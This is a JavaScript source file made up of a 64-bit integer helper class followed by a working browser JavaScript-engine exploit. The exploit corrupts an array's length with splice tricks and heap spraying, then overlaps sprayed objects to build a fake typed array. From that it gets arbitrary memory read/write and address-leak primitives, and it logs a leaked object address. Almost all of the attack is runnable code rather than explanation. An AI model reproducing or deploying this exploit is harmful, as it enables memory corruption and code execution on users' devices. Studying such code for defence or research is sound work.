class BigInt {
	/**
	 * @param  {[number, number]|number|string|BigInt|ArrayLike<number>} 
	*/
	constructor() {
		this.buf = new ArrayBuffer(8);
		this.i8 = new Int8Array(this.buf);
		this.u8 = new Uint8Array(this.buf);
		this.i16 = new Int16Array(this.buf);
		this.u16 = new Uint16Array(this.buf);
		this.i32 = new Int32Array(this.buf);
		this.u32 = new Uint32Array(this.buf);
		this.f32 = new Float32Array(this.buf);
		this.f64 = new Float64Array(this.buf);

		switch(arguments.length) {
			case 1:
				var [val] = arguments;
				switch(typeof val) {
					case 'number':
						if (Number.isNaN(val)) {
							throw new TypeError(`value ${val} is NaN`);
						}

						this.f64[0] = val;
						
						break;
					case 'string':
						if (val.startsWith("0x")) {
							val = val.substring(2);
						}

						if (val.length > this.u8.byteLength * 2) {
							throw new RangeError(`value ${val} is out of range !!`);
						}

						for (var i = 0; i < this.u8.length; i++) {
							var b = 0;

							var str_idx = i * 2;
							if (str_idx < val.length) {
								var start = str_idx;
								var end = Math.min(str_idx + 2, val.length);
								var b_str = val.slice(start, end);
								b = parseInt(b_str, 16);
							}
							
							this.u8[(this.u8.length - 1) - i] = b;
						}

						break;
					case 'object':
						if (val instanceof BigInt) {
            			    this.u8.set(val.u8);
							break;
						} else {
							var prop = BigInt.TYPE_MAP[val.constructor.name];
							if (prop in this) {
								var arr = this[prop];
								if (val.length !== arr.length) {
									throw new Error(`Array length mismatch, expected ${arr.length} got ${val.length}.`);
								}
							
								arr.set(val);
								break;
							}
						}
					default:
						throw new TypeError(`Unsupported value ${val} !!`);
				}
				break;
			case 2:
				var [hi, lo] = arguments;

				if (!Number.isInteger(hi)) {
					throw new RangeError(`hi value ${hi} is not an integer !!`);
				}

				if (!Number.isInteger(lo)) {
					throw new RangeError(`lo value ${lo} is not an integer !!`);
				}

				this.u32[0] = lo;
				this.u32[1] = hi;
				break;
			default:
				throw new TypeError("Unsupported input !!");
		}
	}

	lo() {
		return this.u32[0];
	}


	hi() {
		return this.u32[1];
	}

	d() {
		if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFF)) {
			throw new RangeError("NaN");
		}

		return this.f64[0];
	}

	jsv() {
		if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
			throw new RangeError("NaN");
		}

		var bit = new BigInt(0x10000, 0);

		this.sub(bit);
		var val = this.f64[0];
		this.add(bit);

		return val;
	}

	endian() {
		this.u8.reverse();
	}

	toString() {
		var val = "0x";
		for (var i = this.u8.length - 1; i >= 0; i--) {
			var c = this.u8[i].toString(16);
    		val += c.length === 1 ? '0' + c : c;
		}
		return val;
	}

	add(val) {
		var c = 0; 
		for (var i = 0; i < this.buf.byteLength; i++) {
			var b = this.u8[i] + val.u8[i] + c;
			c = b > 0xFF | 0;
			this.u8[i] = b; 
		}
		
		return this;
	}

	sub(val) {
		var c = 0; 
		for (var i = 0; i < this.buf.byteLength; i++) {
			var b = this.u8[i] - val.u8[i] - c;
			c = b < 0 | 0;
			this.u8[i] = b; 
		}

		return this;
	}

	xor(val) {
		for (var i = 0; i < this.buf.byteLength; i++) {
			this.u8[i] ^= val.u8[i];
		}

		return this;
	}

	and(val) {
		for (var i = 0; i < this.buf.byteLength; i++) {
			this.u8[i] &= val.u8[i];
		}

		return this;
	}

	neg() {
		for (var i = 0; i < this.buf.byteLength; i++) {
			this.u8[i] = ~this.u8[i];
		}

		return this.and(BigInt.One);
	}

	shl(count) {
		if (count < 0 || count > 64) {
			throw new RangeError(`Shift ${count} bits out of range !!`);
		}

		var byte_count = Math.floor(count / 8);
		var bit_count = count % 8;

		for (var i = this.buf.byteLength - 1; i >= 0; i--) {
			var t = i - byte_count;
			var b = t >= 0 ? this.u8[t] : 0;

			if (bit_count) {
				var p = (t - 1) >= 0 ? this.u8[t - 1] : 0;
				b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF;
			}

			this.u8[i] = b;
		}

		return this;
	}

	shr(count) {
		if (count < 0 || count > 64) {
			throw new RangeError(`Shift ${count} bits out of range !!`);
		}

		var byte_count = Math.floor(count / 8);
		var bit_count = count % 8;

		for (var i = 0; i < this.buf.byteLength; i++) {
			var t = i + byte_count;
			var b = t >= 0 ? this.u8[t] : 0;

			if (bit_count) {
				var n = (t + 1) >= 0 ? this.u8[t + 1] : 0;
				b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xFF;
			}

			this.u8[i] = b;
		}

		return this;
	}
}

BigInt.Zero = new BigInt(0, 0);
BigInt.One = new BigInt(0, 1);
BigInt.TYPE_MAP = {
	"Int8Array": "i8",
	"Uint8Array": "u8",
	"Int16Array": "i16",
	"Uint16Array": "u16",
	"Int32Array": "i32",
	"Uint32Array": "u32",
	"Float32Array": "f32",
	"Float64Array": "f64"
}

//var structs = [];
var oob_arr, slave, master;
var leak_target, leak_target_addr;

while (true) {
	var corrupted_idx = -1;

	var arr = [1.1];
	var spray = [];

	arr.length = 0x100000;
	arr.splice(0, 0x11);
	arr.length = 0xfffffff0;

	var new_indexing_header = new BigInt(0x100000, 0x100000);
	for (var i = 0; i < 0x8000; i++)
	{
	    spray[i] = new Array(0x10).fill(new_indexing_header.d());

	    spray[i].p0 = 0.0;
	    spray[i].p1 = 0.1;
	    spray[i].p2 = 0.2;
	    spray[i].p3 = 0.3;
	    spray[i].p4 = 0.4;
		spray[i].p5 = 0.5;
	    spray[i].p6 = 0.6;
	    spray[i].p7 = 0.7;
	    spray[i].p8 = 0.8;
	    spray[i].p9 = 0.9;
	}

	arr.splice(0x1000, 0, 1);

	for (var i = 0; i < 0x8000; i++)
	{
	    if (spray[i].length > 0x10)
	    {
	        corrupted_idx = i;
	        break;
	    }
	}

	if (corrupted_idx != -1) {
		oob_arr = spray[corrupted_idx];
		break;
	}

	log("failed oob, retry...");
}

log(`corrupted oob array length: ${oob_arr.length}`);

while (true) {
	var leak_prim_idx = -1;
	var leak_double_idx = -1;
	var found_prim = false;

	var prim_spray = [];

	var prop = new BigInt(0, 0x13371337);
	for (var i = 0; i < 0x200; i++)
	{
	    prim_spray[i] = new Array(0x10);
		prim_spray[i][0] = 13.37;
		prim_spray[i].fill({}, 1);

		prim_spray[i].p0 = prop.d();
	   	prim_spray[i].p1 = prop.d();
	   	prim_spray[i].p2 = prop.d();
	   	prim_spray[i].p3 = prop.d();
	   	prim_spray[i].p4 = prop.d();
	   	prim_spray[i].p5 = prop.d();
	   	prim_spray[i].p6 = prop.d();
	   	prim_spray[i].p7 = prop.d();
	   	prim_spray[i].p8 = prop.d();
	   	prim_spray[i].p9 = prop.d();
	}

	var marker = new BigInt(0x0, 0x1337);
	for (var i = 0; i < 0x5000; i++)
	{
	    var lookup_idx = 0x65000 + i;
	    var old_val = oob_arr[lookup_idx];

	    if (old_val == undefined) {
			continue;
		}

	    oob_arr[lookup_idx] = marker.d();

	    for (var k = 0; k < 0x200; k++)
	    {
	        if(prim_spray[k].length > 0x10)
	        {
	            found_prim = true;
	            leak_prim_idx = k;
	            leak_double_idx = lookup_idx;

	            oob_arr[lookup_idx] = old_val;

	            break;
	        }
	    }

	    if(found_prim) {
			break;
		}

	    oob_arr[lookup_idx] = old_val;
	}

	if (found_prim) {
		slave = new Uint32Array(0x1000);

		slave[0] = 0x13371337;

		leak_target = {a: 0, b: 0, c: 0, d: 0};
		leak_target.a = slave;

		prim_spray[leak_prim_idx][1] = leak_target;

		leak_target_addr = new BigInt(oob_arr[leak_double_idx+2]);

		log(`leak_target_addr: ${leak_target_addr}`);

		//for (var i = 0; i < 0x100; i++)
        //{
        //    var a = new Uint32Array(1);
        //    a[Math.random().toString(36).replace(/[^a-z]+/g, '').slice(0, 5)] = 1337;
        //    structs.push(a);
        //}

		var rw_target = {a: 0, b: 0, c: 0, d: 0};

		rw_target.a = new BigInt(0x1602300, 0x200).d();
		rw_target.b = 0;
		rw_target.c = slave;
		rw_target.d = 0x1337;

		prim_spray[leak_prim_idx][1] = rw_target;

		var rw_target_addr = new BigInt(oob_arr[leak_double_idx+2]);

		log(`rw_target_addr: ${rw_target_addr}`);

		rw_target_addr.add(new BigInt(0, 0x10));

		oob_arr[leak_double_idx+2] = rw_target_addr.d();

		master = prim_spray[leak_prim_idx][1];

		break;
	}

	log("failed prim, retry...");
}

var prim = {
    read8: function(addr)
    {
        master[4] = addr.lo();
        master[5] = addr.hi();
        var retval = new BigInt(slave[1], slave[0]);
        return retval;
    },
    read4: function(addr)
    {
        master[4] = addr.lo();
        master[5] = addr.hi();
        var retval = new BigInt(0, slave[0]);
        return retval;
    },
    write8: function(addr, val)
    {
        master[4] = addr.lo();
        master[5] = addr.hi();
        if (val instanceof BigInt) {
            slave[0] = val.lo();
            slave[1] = val.hi();
        } else {
            slave[0] = val;
            slave[1] = 0;
        }
    },
    write4: function(addr, val)
    {
        master[4] = addr.lo();
        master[5] = addr.hi();
        slave[0] = val;
    },
    leakval: function(jsval)
    {
        leak_target.a = jsval;
        return prim.read8(new BigInt(leak_target_addr).add(new BigInt(0, 0x10)));
    }
};

var test = { 
	a: 13.37
}

log(test);

var addr = prim.leakval(test);
log(`test addrof: ${addr}`);

while(true) {}
